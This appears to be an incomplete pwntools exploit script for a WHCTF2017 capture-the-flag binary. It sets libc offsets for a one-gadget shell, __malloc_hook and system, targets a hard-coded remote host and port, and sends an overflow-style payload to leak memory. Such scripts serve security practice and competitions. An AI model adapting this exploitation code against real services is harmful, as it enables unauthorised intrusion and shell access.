import time, sys
from pwn import *

# local process envirnoment
LOCAL = True
elf_name = "./pwn1"

#retmote args
remote_host = "118.31.18.29"
remote_port = 20003
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    printf_off = 0x4CDD0
    system_off = 0x3FE70
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def mmenu(opt):
    io.recvuntil("Code:")
    io.sendline(str(opt))

def mod_1(mcontent):
    mmenu(1)
    io.recvuntil("Welcome To WHCTF2017:")
    dlySend(mcontent)

def tell_name(mcontent):
    mmenu(2)
    io.recvuntil("Input Your Name:\n")
    dlySend(mcontent)

def s_exp():
    payload = 'A'*0x400
    payload += "e"
    pause()
    mod_1(payload)
    io.recvuntil("Your Input Is :")
    data = io.recvline()[:-1]
    pause()
    tell_name('a'*0x100)


if __name__ == "__main__":
    s_exp()
    pause()
